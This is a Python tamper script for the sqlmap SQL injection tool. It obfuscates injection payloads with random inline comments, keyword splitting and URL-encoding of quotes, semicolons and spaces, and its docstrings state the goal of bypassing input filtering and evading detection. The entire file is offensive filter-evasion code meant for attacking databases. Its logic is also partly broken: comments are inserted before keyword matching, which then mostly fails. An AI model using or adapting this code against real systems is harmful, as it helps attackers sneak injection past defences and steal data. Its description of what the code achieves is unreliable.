import random
import string

def tamper(payload, **kwargs):
    """
    Advanced tamper script for SQLmap to obfuscate SQL injection payloads
    using keyword substitution, character encoding, and random comment insertion.
    """
    if not payload:
        return payload

    # Randomly insert SQL comments into the payload
    payload = insert_random_comments(payload)

    # Obfuscate keywords (e.g., SELECT -> SEL/**/ECT)
    obfuscated_payload = obfuscate_keywords(payload)

    # Encode certain characters (e.g., ' -> %27)
    encoded_payload = encode_characters(obfuscated_payload)

    return encoded_payload


def obfuscate_keywords(payload):
    """
    Obfuscates SQL keywords by breaking them with random inline comments.
    """
    keywords = [
        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE",
        "ORDER", "GROUP", "HAVING", "LIMIT", "OFFSET", "JOIN"
    ]
    for keyword in keywords:
        if keyword in payload.upper():
            parts = list(keyword)
            obfuscated = "/**/".join(parts)
            payload = payload.replace(keyword, obfuscated, 1)
    return payload


def encode_characters(payload):
    """
    Encodes sensitive characters to bypass input filtering.
    """
    char_map = {
        "'": "%27",
        "\"": "%22",
        "--": "%2D%2D",
        ";": "%3B",
        " ": "%20",
        "=": "%3D"
    }
    for char, encoded in char_map.items():
        payload = payload.replace(char, encoded)
    return payload


def insert_random_comments(payload):
    """
    Inserts random SQL comments in between characters to evade detection.
    """
    result = []
    for char in payload:
        result.append(char)
        if random.choice([True, False]):
            result.append("/**/")
    return ''.join(result)
